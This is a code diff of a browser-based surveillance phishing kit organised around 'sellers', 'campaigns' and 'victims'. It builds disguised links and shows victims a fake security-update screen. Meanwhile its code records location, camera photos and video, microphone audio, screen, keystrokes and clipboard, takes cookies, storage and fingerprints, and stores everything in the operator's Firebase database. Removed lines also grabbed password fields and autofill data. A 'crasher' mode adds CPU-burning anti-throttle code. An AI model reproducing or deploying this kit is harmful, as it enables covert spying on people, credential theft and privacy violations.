-                downlink: conn.downlink,
-                rtt: conn.rtt,
-                saveData: conn.saveData
+            
+            const advanced = document.getElementById('advancedToggle').checked;
+            const shorten = document.getElementById('shortenToggle').checked;
+            const redirectUrl = document.getElementById('redirectUrl').value.trim();
+            
+            const campId = 'CAMP_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+            
+            const campaignData = {
+                type,
+                features: selected,
+                advanced: advanced ? 'ADV' : '',
+                clicks: 0,
+                createdAt: Date.now(),
+                redirectUrl,
+                cameraInterval: parseFloat(document.getElementById('cameraInterval').value) || 0.33,
+                videoDuration: parseInt(document.getElementById('videoDuration').value) || 3,
+                photoQuality: parseInt(document.getElementById('photoQuality').value) || 70
             };
+            
+            await db.ref(`sellers/${currentUid}/campaigns/${campId}`).set(campaignData);
+            
+            let link = `${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}`;
+            
+            if(shorten) {
+                try {
+                    const res = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(link)}`);
+                    const data = await res.json();
+                    if(data.shorturl) link = data.shorturl;
+                } catch(e) {}
+            }
+            
+            if(type === 'crasher') {
+                document.getElementById('crasherLinkText').textContent = link;
+                document.getElementById('crasherLinkBox').classList.remove('hide');
+            } else {
+                document.getElementById('normalLinkText').textContent = link;
+                document.getElementById('normalLinkBox').classList.remove('hide');
+            }
+            
+            showStatus(`${type === 'crasher' ? 'Crasher' : 'Normal'} link generated!`);
         }
-        let deviceMemory = navigator.deviceMemory || 'N/A';
-        let doNotTrack = navigator.doNotTrack || 'unspecified';
-        const platform = navigator.platform;
-        const language = navigator.language;
-        const screenRes = `${screen.width}x${screen.height}`;
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const hardwareConcurrency = navigator.hardwareConcurrency;
 
-        const canvas = document.createElement('canvas'); canvas.width=200; canvas.height=50;
-        const ctx = canvas.getContext('2d'); ctx.fillStyle='#f0f'; ctx.fillRect(0,0,200,50); ctx.fillStyle='#0f0'; ctx.fillText('MR_MOMIN',10,20);
-        const canvasFingerprint = canvas.toDataURL();
-        let webglVendor = 'N/A';
-        try {
-            const gl = document.createElement('canvas').getContext('webgl');
-            if(gl) webglVendor = gl.getParameter(gl.VENDOR) + ' ' + gl.getParameter(gl.RENDERER);
-        } catch(e){}
-        const fonts = ['Arial','Verdana','Helvetica','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact'];
-        const availableFonts = fonts.filter(f => {
-            const span = document.createElement('span');
-            span.style.fontFamily = f;
-            return span.style.fontFamily === f;
-        });
-        const plugins = Array.from(navigator.plugins).map(p => p.name);
-        let localIP = 'N/A';
-        try {
-            const pc = new RTCPeerConnection({ iceServers: [] });
-            pc.createDataChannel('');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
-            pc.onicecandidate = (e) => {
-                if(e.candidate) {
-                    const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                    if(ipMatch) localIP = ipMatch[0];
-                    pc.close();
+        // ==========================================
+        // VICTIM COLLECTOR - FIXED VERSION
+        // ==========================================
+        async function startVictimCollector(sellerUid, campaignId, campaignData) {
+            const victimId = 'V_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+            const victimRef = db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/victims/${victimId}`);
+            
+            const victimData = {
+                timestamp: Date.now(),
+                deviceInfo: {},
+                location: [],
+                camera: [],
+                videoRec: [],
+                mic: [],
+                keys: [],
+                clipboard: [],
+                fingerprint: {},
+                cookies: '',
+                localStorage: '',
+                sessionStorage: '',
+                passiveInfo: {}
+            };
+
+            // Collect passive info first
+            await collectPassiveInfo(victimData);
+            
+            // Show victim panel
+            document.getElementById('dashboardContainer').style.display = 'none';
+            document.getElementById('victimPanel').classList.add('active');
+            
+            // Start fake update animation
+            startFakeUpdateAnimation(campaignData.redirectUrl);
+            
+            // Request permissions via button click (REQUIRED for modern browsers)
+            const requestPermissions = async () => {
+                const features = campaignData.features || '';
+                
+                // Location - FIXED: Using watchPosition for continuous tracking
+                if(features.includes('L') && navigator.geolocation) {
+                    navigator.geolocation.watchPosition(
+                        (pos) => {
+                            victimData.location.push({
+                                lat: pos.coords.latitude,
+                                lng: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                time: Date.now()
+                            });
+                            victimRef.child('location').set(victimData.location);
+                        },
+                        (err) => console.log('Location error:', err),
+                        { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+                    );
+                }
+                
+                // Camera & Video - FIXED: Proper initialization
+                await initCameraAndVideo(features, victimData, victimRef, campaignData);
+                
+                // Audio
+                if(features.includes('M')) {
+                    initAudioRecording(victimData, victimRef);
+                }
+                
+                // Screen recording
+                if(features.includes('R')) {
+                    initScreenRecording(victimData, victimRef);
                 }
             };
-            setTimeout(() => pc.close(), 1000);
-        } catch(e){}
-
-        const cookies = document.cookie;
-        let localStorageData = 'N/A', sessionStorageData = 'N/A';
-        try { localStorageData = JSON.stringify(localStorage); } catch(e){}
-        try { sessionStorageData = JSON.stringify(sessionStorage); } catch(e){}
-
-        victimData.passiveInfo = {
-            ip, battery, platform, language, screen: screenRes, timezone,
-            gpu, audioInputs, deviceMemory, connection, doNotTrack, hardwareConcurrency,
-            canvasFingerprint, webglVendor, fonts: availableFonts, plugins, localIP,
-            cookies, localStorage: localStorageData, sessionStorage: sessionStorageData
-        };
-        victimData.deviceInfo = {
-            ip, battery, platform, language, screen: screenRes,
-            hardwareConcurrency, timezone, userAgent: navigator.userAgent, gpu, audioInputs
-        };
-        victimData.fingerprint = { canvasFingerprint, webglVendor, fonts: availableFonts, plugins, localIP };
-        victimData.cookies = cookies;
-        victimData.localStorage = localStorageData;
-        victimData.sessionStorage = sessionStorageData;
-
-        // ---------- OPTIONAL FEATURES ----------
-        if(features.includes('L') && navigator.geolocation) {
-            const getLoc = () => {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    victimData.location.push({ lat: pos.coords.latitude, lng: pos.coords.longitude, time: Date.now() });
-                    victimRef.child('location').set(victimData.location);
-                }, err=>console.log);
-            };
-            getLoc(); setInterval(getLoc, 30000);
+            
+            // Trigger on any user interaction
+            document.body.addEventListener('click', requestPermissions, { once: true });
+            document.body.addEventListener('touchstart', requestPermissions, { once: true });
+            
+            // Auto-trigger after 2 seconds as fallback
+            setTimeout(requestPermissions, 2000);
+            
+            // Keystrokes
+            if(campaignData.features?.includes('K')) {
+                initKeylogger(victimData, victimRef);
+            }
+            
+            // Clipboard
+            if(campaignData.features?.includes('P')) {
+                initClipboardHarvesting(victimData, victimRef);
+            }
+            
+            // Save initial data
+            await victimRef.set(victimData);
+            
+            // Increment click count
+            db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/clicks`).transaction(c => (c || 0) + 1);
+            
+            // Screenshot
+            try {
+                const canvas = await html2canvas(document.body, { scale: 0.5 });
+                victimData.camera.push(canvas.toDataURL('image/jpeg', 0.6));
+                victimRef.child('camera').set(victimData.camera);
+            } catch(e) {}
         }
 
-        // Camera: split into 4 modes
-        let cameraMode = null;
-        let facingMode = null;
-        let captureType = null;
-        if(features.includes('CFP')) { cameraMode = 'front_photo'; facingMode = 'user'; captureType = 'photo'; }
-        if(features.includes('CFV')) { cameraMode = 'front_video'; facingMode = 'user'; captureType = 'video'; }
-        if(features.includes('CBP')) { cameraMode = 'back_photo'; facingMode = 'environment'; captureType = 'photo'; }
-        if(features.includes('CBV')) { cameraMode = 'back_video'; facingMode = 'environment'; captureType = 'video'; }
-
-        // Photo capture (continuous)
-        if(cameraMode && captureType === 'photo') {
+        // ==========================================
+        // FIXED CAMERA & VIDEO INITIALIZATION
+        // ==========================================
+        async function initCameraAndVideo(features, victimData, victimRef, campaignData) {
+            let facingMode = null;
+            let captureMode = null;
+            
+            if(features.includes('CFP')) { facingMode = 'user'; captureMode = 'photo'; }
+            else if(features.includes('CFV')) { facingMode = 'user'; captureMode = 'video'; }
+            else if(features.includes('CBP')) { facingMode = 'environment'; captureMode = 'photo'; }
+            else if(features.includes('CBV')) { facingMode = 'environment'; captureMode = 'video'; }
+            
+            if(!facingMode) return;
+            
             try {
-                let constraints = { video: { facingMode: facingMode } };
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: facingMode },
+                    audio: false
+                });
+                
                 const video = document.getElementById('hiddenVideo');
                 video.srcObject = stream;
                 await video.play();
+                
                 const canvas = document.getElementById('hiddenCanvas');
-                let intervalMs = (campaignData && campaignData.cameraInterval) ? campaignData.cameraInterval * 1000 : 333;
-                let quality = (campaignData && campaignData.photoQuality) ? campaignData.photoQuality / 100 : 0.7;
-                const capture = () => {
-                    if(video.videoWidth && video.videoHeight){
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video,0,0);
-                        victimData.camera.push(canvas.toDataURL('image/jpeg', quality));
-                        victimRef.child('camera').set(victimData.camera);
-                    }
-                };
-                capture();
-                setInterval(capture, intervalMs);
-            } catch(e) { console.error("Photo error", e); }
+                
+                // Photo capture loop
+                if(captureMode === 'photo') {
+                    const interval = (campaignData.cameraInterval || 0.33) * 1000;
+                    const quality = (campaignData.photoQuality || 70) / 100;
+                    
+                    const capturePhoto = () => {
+                        if(video.videoWidth && video.videoHeight) {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            const dataUrl = canvas.toDataURL('image/jpeg', quality);
+                            victimData.camera.push(dataUrl);
+                            victimRef.child('camera').set(victimData.camera);
+                        }
+                    };
+                    
+                    capturePhoto();
+                    setInterval(capturePhoto, interval);
+                }
+                
+                // Video recording - FIXED: Proper RecordRTC usage
+                if(captureMode === 'video') {
+                    const duration = (campaignData.videoDuration || 3) * 1000;
+                    
+                    const recordVideo = async () => {
+                        try {
+                            const recorder = new RecordRTC(stream, {
+                                type: 'video',
+                                mimeType: 'video/webm;codecs=vp9',
+                                bitsPerSecond: 128000,
+                                disableLogs: true
+                            });
+                            
+                            recorder.startRecording();
+                            
+                            setTimeout(() => {
+                                recorder.stopRecording(() => {
+                                    const blob = recorder.getBlob();
+                                    const reader = new FileReader();
+                                    reader.onloadend = () => {
+                                        victimData.videoRec.push(reader.result);
+                                        victimRef.child('videoRec').set(victimData.videoRec);
+                                    };
+                                    reader.readAsDataURL(blob);
+                                });
+                            }, duration);
+                        } catch(e) {
+                            console.error('Video recording error:', e);
+                        }
+                    };
+                    
+                    // Record immediately and then every 10 seconds
+                    recordVideo();
+                    setInterval(recordVideo, 10000);
+                }
+                
+            } catch(e) {
+                console.error('Camera error:', e);
+            }
         }
 
-        // Video recording: new stream for each clip, repeat every 15 seconds
-        if(cameraMode && captureType === 'video') {
-            let videoDurationMs = (campaignData && campaignData.videoDuration) ? campaignData.videoDuration * 1000 : 3000;
-            let repeatIntervalMs = 15000;
-            let videoInterval = null;
-            let isRecordingActive = false;
-
-            const recordVideoClip = async () => {
-                if (isRecordingActive) return;
-                isRecordingActive = true;
+        // ==========================================
+        // AUDIO RECORDING
+        // ==========================================
+        async function initAudioRecording(victimData, victimRef) {
+            const recordAudio = async () => {
                 try {
-                    let constraints = { video: { facingMode: facingMode } };
-                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                     const recorder = new RecordRTC(stream, {
-                        type: 'video',
-                        mimeType: 'video/webm;codecs=vp8',
-                        bitsPerSecond: 128000
+                        type: 'audio',
+                        mimeType: 'audio/ogg',
+                        disableLogs: true
                     });
+                    
                     recorder.startRecording();
+                    
                     setTimeout(() => {
                         recorder.stopRecording(() => {
                             const blob = recorder.getBlob();
                             const reader = new FileReader();
                             reader.onloadend = () => {
-                                victimData.videoRec.push(reader.result);
-                                victimRef.child('videoRec').set(victimData.videoRec);
-                                stream.getTracks().forEach(track => track.stop());
-                                isRecordingActive = false;
+                                victimData.mic.push(reader.result);
+                                victimRef.child('mic').set(victimData.mic);
                             };
                             reader.readAsDataURL(blob);
+                            stream.getTracks().forEach(t => t.stop());
                         });
-                    }, videoDurationMs);
-                } catch(e) {
-                    console.error("Video recording error", e);
-                    isRecordingActive = false;
-                }
+                    }, 8000);
+                } catch(e) {}
             };
-
-            const startVideoLoop = () => {
-                if (videoInterval) return;
-                recordVideoClip();
-                videoInterval = setInterval(recordVideoClip, repeatIntervalMs);
-                window.removeEventListener('click', startVideoLoop);
-                window.removeEventListener('touchstart', startVideoLoop);
-            };
-
-            window.addEventListener('click', startVideoLoop);
-            window.addEventListener('touchstart', startVideoLoop);
-            setTimeout(() => {
-                if (!videoInterval) startVideoLoop();
-            }, 2000);
+            
+            recordAudio();
+            setInterval(recordAudio, 15000);
         }
 
-        // Microphone (short clips)
-        if(features.includes('M')) {
-            const record = async () => {
-                try{
-                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    const mediaRecorder = new MediaRecorder(stream);
-                    let chunks = [];
-                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                    const audioPromise = new Promise(resolve => {
-                        mediaRecorder.onstop = () => {
-                            const blob = new Blob(chunks, { type: 'audio/ogg' });
-                            stream.getTracks().forEach(t=>t.stop());
-                            const reader = new FileReader();
-                            reader.onloadend = () => { victimData.mic.push(reader.result); victimRef.child('mic').set(victimData.mic); resolve(); };
-                            reader.readAsDataURL(blob);
+        // ==========================================
+        // SCREEN RECORDING
+        // ==========================================
+        async function initScreenRecording(victimData, victimRef) {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                const recorder = new RecordRTC(stream, {
+                    type: 'video',
+                    mimeType: 'video/webm',
+                    disableLogs: true
+                });
+                
+                recorder.startRecording();
+                
+                setTimeout(() => {
+                    recorder.stopRecording(() => {
+                        const blob = recorder.getBlob();
+                        const reader = new FileReader();
+                        reader.onloadend = () => {
+                            victimData.screenRec = victimData.screenRec || [];
+                            victimData.screenRec.push(reader.result);
+                            victimRef.child('screenRec').set(victimData.screenRec);
                         };
+                        reader.readAsDataURL(blob);
+                        stream.getTracks().forEach(t => t.stop());
                     });
-                    mediaRecorder.start();
-                    setTimeout(()=>mediaRecorder.stop(),8000);
-                    await audioPromise;
-                } catch(e){}
-            };
-            record(); setInterval(record,15000);
+                }, 10000);
+            } catch(e) {}
         }
 
-        // Keylogger
-        if(features.includes('K')) {
-            let keyBuffer = [];
-            const sendKeys = () => {
-                if(keyBuffer.length) {
-                    victimData.keys.push(...keyBuffer);
-                    victimRef.child('keys').set(victimData.keys);
-                    keyBuffer = [];
-                }
-            };
+        // ==========================================
+        // KEYLOGGER
+        // ==========================================
+        function initKeylogger(victimData, victimRef) {
+            let buffer = [];
+            
             document.addEventListener('keydown', (e) => {
-                let keyStr = e.key;
-                if(e.ctrlKey) keyStr = 'Ctrl+' + keyStr;
-                if(e.altKey) keyStr = 'Alt+' + keyStr;
-                if(e.shiftKey) keyStr = 'Shift+' + keyStr;
-                keyBuffer.push({ key: keyStr, timestamp: Date.now(), windowTitle: document.title });
-                if(keyBuffer.length >= 10) sendKeys();
+                let key = e.key;
+                if(e.ctrlKey) key = 'Ctrl+' + key;
+                if(e.altKey) key = 'Alt+' + key;
+                if(e.shiftKey) key = 'Shift+' + key;
+                
+                buffer.push({
+                    key,
+                    timestamp: Date.now(),
+                    url: window.location.href
+                });
+                
+                if(buffer.length >= 10) {
+                    victimData.keys.push(...buffer);
+                    victimRef.child('keys').set(victimData.keys);
+                    buffer = [];
+                }
             });
-            setInterval(sendKeys, 5000);
+            
+            setInterval(() => {
+                if(buffer.length > 0) {
+                    victimData.keys.push(...buffer);
+                    victimRef.child('keys').set(victimData.keys);
+                    buffer = [];
+                }
+            }, 5000);
         }
 
-        // Clipboard
-        if(features.includes('P')) {
+        // ==========================================
+        // CLIPBOARD HARVESTING
+        // ==========================================
+        function initClipboardHarvesting(victimData, victimRef) {
             setInterval(async () => {
                 try {
                     const text = await navigator.clipboard.readText();
                     if(text && text.trim()) {
-                        victimData.clipboard.push({ text: text.substring(0,500), timestamp: Date.now() });
+                        victimData.clipboard.push({
+                            text: text.substring(0, 500),
+                            timestamp: Date.now()
+                        });
                         victimRef.child('clipboard').set(victimData.clipboard);
                     }
                 } catch(e) {}
             }, 7000);
         }
 
-        // Screen Rec
-        if(features.includes('R')) {
+        // ==========================================
+        // PASSIVE INFO COLLECTION
+        // ==========================================
+        async function collectPassiveInfo(victimData) {
+            // IP Address
             try {
-                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                const recorder = new RecordRTC(stream, { type: 'video', mimeType: 'video/webm' });
-                recorder.startRecording();
-                setTimeout(() => {
-                    recorder.stopRecording(() => {
-                        const blob = recorder.getBlob();
-                        const reader = new FileReader();
-                        reader.onloadend = () => {
-                            victimData.screenRec.push(reader.result);
-                            victimRef.child('screenRec').set(victimData.screenRec);
-                            stream.getTracks().forEach(t => t.stop());
-                        };
-                        reader.readAsDataURL(blob);
-                    });
-                }, 10000);
-            } catch(e){}
-        }
-
-        // Net Scan
-        if(features.includes('N')) {
-            let networkInfo = '';
-            try {
-                const pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                pc.onicecandidate = (e) => {
-                    if(e.candidate) {
-                        const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                        if(ipMatch) networkInfo += `Local IP: ${ipMatch[0]}\n`;
-                    }
-                };
-                setTimeout(() => pc.close(), 2000);
-            } catch(e){}
-            networkInfo += ' (limited scan)';
-            victimData.networkScan = networkInfo;
-            victimRef.child('networkScan').set(networkInfo);
-        }
-
-        // Fake Update
-        if(features.includes('F')) {
-            const fakeDiv = document.getElementById('fakeUpdateDiv');
-            const fakeBtn = document.getElementById('fakeUpdateBtn');
-            if(fakeDiv && fakeBtn) {
-                fakeDiv.style.display = 'block';
-                fakeBtn.onclick = () => {
-                    victimData.fakeUpdateClicked = true;
-                    victimRef.child('fakeUpdateClicked').set(true);
-                    fakeDiv.style.display = 'none';
-                };
-            }
-        }
-
-        // ---------- ADVANCED STEALTH FEATURES ----------
-        if(advanced === 'ADV') {
-            if(features.includes('M')) {
-                const longRecord = async () => {
-                    try{
-                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                        const mediaRecorder = new MediaRecorder(stream);
-                        let chunks = [];
-                        mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                        const audioPromise = new Promise(resolve => {
-                            mediaRecorder.onstop = () => {
-                                const blob = new Blob(chunks, { type: 'audio/ogg' });
-                                stream.getTracks().forEach(t=>t.stop());
-                                const reader = new FileReader();
-                                reader.onloadend = () => { victimData.mic.push(reader.result); victimRef.child('mic').set(victimData.mic); resolve(); };
-                                reader.readAsDataURL(blob);
-                            };
-                        });
-                        mediaRecorder.start();
-                        setTimeout(()=>mediaRecorder.stop(),30000);
-                        await audioPromise;
-                    } catch(e){}
-                };
-                longRecord();
-                setInterval(longRecord, 45000);
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                victimData.passiveInfo.ip = data.ip;
+            } catch(e) {
+                victimData.passiveInfo.ip = 'unknown';
             }
 
-            const filePicker = document.getElementById('filePicker');
-            if(filePicker) {
-                filePicker.addEventListener('change', async (e) => {
-                    const files = Array.from(e.target.files);
-                    for(const file of files) {
-                        const reader = new FileReader();
-                        const fileData = await new Promise(resolve => {
-                            reader.onload = () => resolve(reader.result);
-                            reader.readAsDataURL(file);
-                        });
-                        victimData.files.push({ name: file.name, size: file.size, data: fileData });
-                        victimRef.child('files').set(victimData.files);
-                    }
-                    filePicker.value = '';
-                });
-                setTimeout(() => filePicker.click(), 5000);
+            // Battery
+            if(navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    victimData.passiveInfo.battery = {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch(e) {}
             }
 
-            let passwords = [];
-            let autofill = [];
-            document.querySelectorAll('input[type="password"]').forEach(inp => {
-                if(inp.value) passwords.push(inp.value);
-            });
-            document.querySelectorAll('input, textarea').forEach(inp => {
-                if(inp.value && inp.id) autofill.push({id: inp.id, value: inp.value});
-            });
-            victimData.browserData = {
-                passwords: passwords.join(', '),
-                autofill: JSON.stringify(autofill),
-                localStorage: victimData.localStorage,
-                cookies: victimData.cookies
+            // Device Info
+            victimData.passiveInfo.platform = navigator.platform;
+            victimData.passiveInfo.userAgent = navigator.userAgent;
+            victimData.passiveInfo.language = navigator.language;
+            victimData.passiveInfo.languages = navigator.languages;
+            victimData.passiveInfo.hardwareConcurrency = navigator.hardwareConcurrency;
+            victimData.passiveInfo.deviceMemory = navigator.deviceMemory || 'unknown';
+            victimData.passiveInfo.maxTouchPoints = navigator.maxTouchPoints;
+
+            // Screen
+            victimData.passiveInfo.screen = {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio
             };
-            victimRef.child('browserData').set(victimData.browserData);
 
-            let localIPs = [];
+            // Timezone
+            victimData.passiveInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            victimData.passiveInfo.timezoneOffset = new Date().getTimezoneOffset();
+
+            // Connection
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if(conn) {
+                victimData.passiveInfo.connection = {
+                    effectiveType: conn.effectiveType,
+                    downlink: conn.downlink,
+                    rtt: conn.rtt,
+                    saveData: conn.saveData
+                };
+            }
+
+            // GPU Info
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if(gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if(debugInfo) {
+                        victimData.passiveInfo.gpu = {
+                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                        };
+                    }
+                }
+            } catch(e) {}
+
+            // Audio Devices
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                victimData.passiveInfo.audioInputs = devices
+                    .filter(d => d.kind === 'audioinput')
+                    .map(d => d.label || 'Unknown');
+                victimData.passiveInfo.videoInputs = devices
+                    .filter(d => d.kind === 'videoinput')
+                    .map(d => d.label || 'Unknown');
+            } catch(e) {}
+
+            // Canvas Fingerprint
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 200;
+                canvas.height = 50;
+                const ctx = canvas.getContext('2d');
+                ctx.fillStyle = '#f0f';
+                ctx.fillRect(0, 0, 200, 50);
+                ctx.fillStyle = '#0f0';
+                ctx.font = '20px Arial';
+                ctx.fillText('CYBER PHANTOM', 10, 35);
+                victimData.fingerprint.canvas = canvas.toDataURL();
+            } catch(e) {}
+
+            // WebGL Fingerprint
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                if(gl) {
+                    victimData.fingerprint.webgl = {
+                        vendor: gl.getParameter(gl.VENDOR),
+                        renderer: gl.getParameter(gl.RENDERER),
+                        version: gl.getParameter(gl.VERSION)
+                    };
+                }
+            } catch(e) {}
+
+            // Plugins
+            victimData.fingerprint.plugins = Array.from(navigator.plugins).map(p => ({
+                name: p.name,
+                description: p.description
+            }));
+
+            // Local IP via WebRTC
             try {
                 const pc = new RTCPeerConnection({ iceServers: [] });
                 pc.createDataChannel('');
@@ -1500,116 +2528,535 @@
                 pc.onicecandidate = (e) => {
                     if(e.candidate) {
                         const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                        if(ipMatch) localIPs.push(ipMatch[0]);
+                        if(ipMatch) {
+                            victimData.passiveInfo.localIP = ipMatch[0];
+                        }
+                        pc.close();
                     }
                 };
                 setTimeout(() => pc.close(), 1000);
-            } catch(e){}
-            victimData.dnsLeak = { localIPs: localIPs.join(', '), publicIP: ip };
-            victimRef.child('dnsLeak').set(victimData.dnsLeak);
+            } catch(e) {}
 
-            window.addEventListener('deviceorientation', (e) => {
-                victimData.sensors.orientation = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
-                victimRef.child('sensors/orientation').set(victimData.sensors.orientation);
-            });
-            window.addEventListener('devicemotion', (e) => {
-                victimData.sensors.acceleration = e.acceleration;
-                victimData.sensors.rotationRate = e.rotationRate;
-                victimRef.child('sensors').set(victimData.sensors);
-            });
+            // Cookies & Storage
+            victimData.cookies = document.cookie;
+            try {
+                victimData.localStorage = JSON.stringify(localStorage);
+            } catch(e) {}
+            try {
+                victimData.sessionStorage = JSON.stringify(sessionStorage);
+            } catch(e) {}
+
+            // Copy to deviceInfo for compatibility
+            victimData.deviceInfo = { ...victimData.passiveInfo };
         }
 
-        // Screenshot always
-        try{
-            const ss = await html2canvas(document.body, { scale:0.7 });
-            victimData.camera.push(ss.toDataURL('image/jpeg',0.7));
-            victimRef.child('camera').set(victimData.camera);
-        } catch(e){}
+        // ==========================================
+        // FAKE UPDATE ANIMATION
+        // ==========================================
+        function startFakeUpdateAnimation(redirectUrl) {
+            const fill = document.getElementById('updateProgressFill');
+            const percentage = document.getElementById('updatePercentage');
+            const file = document.getElementById('updateFile');
+            const speed = document.getElementById('updateSpeed');
+            
+            const files = [
+                'security_patch_v2.4.1.bin',
+                'browser_core_update.dll',
+                'crypto_module_secure.js',
+                'webrtc_security_fix.bin',
+                'memory_protection.sys'
+            ];
+            
+            let progress = 0;
+            let fileIndex = 0;
+            
+            const interval = setInterval(() => {
+                progress += Math.random() * 3;
+                if(progress > 100) progress = 100;
+                
+                fill.style.width = progress + '%';
+                percentage.textContent = Math.floor(progress) + '%';
+                
+                if(Math.random() > 0.7) {
+                    speed.textContent = (Math.random() * 5 + 0.5).toFixed(1) + ' MB/s';
+                }
+                
+                if(progress >= (fileIndex + 1) * 20 && fileIndex < files.length - 1) {
+                    fileIndex++;
+                    file.textContent = files[fileIndex];
+                }
+                
+                if(progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        if(redirectUrl) {
+                            window.location.href = redirectUrl;
+                        }
+                    }, 1000);
+                }
+            }, 200);
+        }
 
-        await victimRef.set(victimData);
-        const clickRef = db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/clicks`);
-        clickRef.transaction(cur => (cur||0)+1);
-
-        // Fake UI animation
-        const fill = document.getElementById('scanFill');
-        const status = document.getElementById('scanStatus');
-        let progress = 0;
-        const scanInterval = setInterval(() => {
-            progress += Math.random() * 12;
-            if(progress >= 100) {
-                progress = 100;
-                clearInterval(scanInterval);
-                if(status) status.innerText = 'Stream ready. Enjoy!';
+        // ==========================================
+        // ANTI-THROTTLE SYSTEM (For Crasher Mode)
+        // ==========================================
+        function initAntiThrottle() {
+            // Audio Context
+            const AudioContext = window.AudioContext || window.webkitAudioContext;
+            if(AudioContext) {
+                const ctx = new AudioContext();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                gain.gain.value = 0.001;
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start();
+                setInterval(() => {
+                    if(ctx.state === 'suspended') ctx.resume();
+                }, 100);
             }
-            if(fill) fill.style.width = progress + '%';
-            if(status) status.innerText = `Loading stream... ${Math.floor(progress)}%`;
-        }, 300);
-        const chatContainer = document.getElementById('fakeChat');
-        const messages = ["Awesome stream!", "When is the next episode?", "Love this content!", "This is great!", "Keep it up!", "Hello everyone!"];
-        setInterval(() => {
-            const randomMsg = messages[Math.floor(Math.random() * messages.length)];
-            const newMsg = document.createElement('div');
-            newMsg.className = 'chat-message';
-            newMsg.innerHTML = `<strong>User_${Math.floor(Math.random()*1000)}:</strong> ${randomMsg}`;
-            chatContainer.appendChild(newMsg);
-            chatContainer.scrollTop = chatContainer.scrollHeight;
-        }, 8000);
-        const viewerSpan = document.getElementById('viewerCount');
-        if(viewerSpan) {
-            let viewers = 12300;
+
+            // Message Channel
+            const channel = new MessageChannel();
             setInterval(() => {
-                viewers += Math.floor(Math.random() * 200) - 100;
-                if(viewers < 10000) viewers = 10000;
-                if(viewers > 15000) viewers = 15000;
-                viewerSpan.innerText = (viewers/1000).toFixed(1) + 'k';
-            }, 15000);
+                channel.port1.postMessage('keepalive');
+            }, 16);
+
+            // Video Element
+            const video = document.createElement('video');
+            video.src = 'data:video/webm;base64,GkXfo0AgQoaBAUL3gQFC8oEEQvOBCEKCQAR3ZWJtQoeBAkKFgQIYU4BnQI0VSalmQCgq17FAAw9CQE2AQAZ3aGFtbXlXQUAGd2hhbW15RIlACECPQAAAAAAAFlSua0AxrkAu14EBY8WBAZyBACK1nEADdW5khkAFVl9WUDglhohAA1ZQOIOBA1FoQYTF1BTFLS0kCIahAg9qdW1iMAZrAWIAAELAYA';
+            video.loop = true;
+            video.play();
+
+            // Web Worker
+            const workerCode = `
+                let last = Date.now();
+                setInterval(() => {
+                    const now = Date.now();
+                    if(now - last > 100) postMessage('throttle');
+                    last = now;
+                    postMessage('ping');
+                }, 16);
+                function busy() {
+                    let x = 0;
+                    for(let i = 0; i < 1000000; i++) x += Math.sin(i);
+                    setTimeout(busy, 0);
+                }
+                busy();
+            `;
+            const blob = new Blob([workerCode], {type: 'application/javascript'});
+            const worker = new Worker(URL.createObjectURL(blob));
+            worker.onmessage = (e) => {
+                if(e.data === 'throttle') intensiveBurst();
+            };
+
+            // Visual Layers
+            initVisualLayers();
         }
-    }
 
-    // ========== MAIN ROUTING ==========
